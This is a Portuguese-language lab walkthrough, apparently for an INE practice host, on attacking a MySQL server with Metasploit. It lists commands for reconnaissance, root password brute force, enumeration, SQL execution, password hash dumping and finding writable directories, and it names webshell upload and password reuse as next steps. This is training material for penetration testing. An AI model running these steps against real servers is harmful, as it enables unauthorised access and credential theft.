## Exploração de MySQL com Metasploit

Objetivo: enumerar e extrair informações sensíveis de um servidor

- MySQL  
    usando o
- Metasploit Framework

---

# Passo 1 — Verificar conectividade

ping -c 4 demo.ine.local

Se responder → alvo acessível.

---

# Passo 2 — Scan inicial

nmap demo.ine.local

Procure:

3306/tcp open mysql

Isso indica MySQL ativo.

---

# Passo 3 — Abrir Metasploit

msfconsole -q

---

# Passo 4 — Descobrir versão do MySQL

use auxiliary/scanner/mysql/mysql_version  
set RHOSTS demo.ine.local  
run

Isso mostra:

- versão MySQL
- banner do serviço

---

# Passo 5 — Brute force de login

use auxiliary/scanner/mysql/mysql_login  
set RHOSTS demo.ine.local  
set USERNAME root  
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  
set VERBOSE false  
run

Se funcionar, verá algo como:

SUCCESSFUL LOGIN root:twinkle

---

# Passo 6 — Enumeração do servidor

use auxiliary/admin/mysql/mysql_enum  
set USERNAME root  
set PASSWORD twinkle  
set RHOSTS demo.ine.local  
run

Retorna:

- usuários
- databases
- privilégios

---

# Passo 7 — Executar comandos SQL

use auxiliary/admin/mysql/mysql_sql  
set USERNAME root  
set PASSWORD twinkle  
set RHOSTS demo.ine.local  
run

Exemplo de query:

select user();

---

# Passo 8 — Enumeração de arquivos

use auxiliary/scanner/mysql/mysql_file_enum  
set USERNAME root  
set PASSWORD twinkle  
set RHOSTS demo.ine.local  
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt  
set VERBOSE true  
run

Procura arquivos acessíveis no sistema.

---

# Passo 9 — Dump de hashes

use auxiliary/scanner/mysql/mysql_hashdump  
set USERNAME root  
set PASSWORD twinkle  
set RHOSTS demo.ine.local  
run

Extrai:

- hashes de senha
- usuários do banco

---

# Passo 10 — Dump de schema

use auxiliary/scanner/mysql/mysql_schemadump  
set USERNAME root  
set PASSWORD twinkle  
set RHOSTS demo.ine.local  
run

Mostra:

- databases
- tabelas
- colunas

---

# Passo 11 — Diretórios graváveis

use auxiliary/scanner/mysql/mysql_writable_dirs  
set RHOSTS demo.ine.local  
set USERNAME root  
set PASSWORD twinkle  
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt  
run

Importante para:

- upload de webshell
- gravação de arquivos

---

# Fluxo simples para iniciantes

Ping  
 ↓  
Nmap  
 ↓  
mysql_version  
 ↓  
mysql_login  
 ↓  
mysql_enum  
 ↓  
mysql_sql  
 ↓  
hashdump  
 ↓  
schemadump

---

# O que você ganha com isso

|Módulo|Informação obtida|
|---|---|
|mysql_version|versão|
|mysql_login|credenciais|
|mysql_enum|usuários|
|mysql_sql|execução SQL|
|mysql_hashdump|hashes|
|mysql_schemadump|databases|
|mysql_writable_dirs|diretórios graváveis|

---

# Possível exploração após isso

- login SSH com senha reutilizada
- upload webshell em diretório web
- leitura de arquivos sensíveis
- dump completo do banco

---

# Comandos essenciais (resumo rápido)

msfconsole -q  
  
use auxiliary/scanner/mysql/mysql_version  
set RHOSTS demo.ine.local  
run  
  
use auxiliary/scanner/mysql/mysql_login  
set RHOSTS demo.ine.local  
set USERNAME root  
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  
run  
  
use auxiliary/admin/mysql/mysql_enum  
set USERNAME root  
set PASSWORD twinkle  
set RHOSTS demo.ine.local  
run